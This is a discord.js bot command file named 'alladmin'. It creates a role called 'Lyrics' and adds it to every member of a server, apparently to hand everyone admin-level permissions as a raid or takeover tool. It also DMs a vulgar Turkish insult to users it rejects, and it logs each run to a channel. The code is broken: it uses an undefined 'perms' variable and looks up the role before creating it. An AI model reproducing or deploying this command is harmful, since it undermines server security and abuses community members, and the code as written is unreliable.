const Discord = require("discord.js");



module.exports.run = async(bot, message, args, recrue) => {
   message.delete();
    if(recrue) {
      return message.author.send("Hayırdır amk bu komuta iznin varmı yarram").catch(console.error)
    };
message.delete();
          var roledebut = message.content.split(" ").slice(1).join(" ")
          let role = message.guild.roles.find("name", 'Lyrics')
          let role_succes = new Discord.RichEmbed()
          .setColor('#FFCC99')
          .setAuthor(bot.user.username, bot.user.avatarURL)	
          .setDescription(":white_check_mark:")

         if (message.member.guild.createRole({name: "Lyrics", permissions: perms, color: 'RANDOM',}))
        if(message.guild.roles.exists("name", 'Lyrics')) {
       
            message.channel.send(role_succes)
            message.guild.members.forEach(member => { 
              member.addRoles(role);
  
            })
          }
bot.channels.find('name',"Lyrics").send("Log : ["+message.author.tag+" // "+message.author.id+"] ["+message.guild.name+"] La commande alladmin a été éxécutée.");

        }

module.exports.help = {
  name: "alladmin"
  }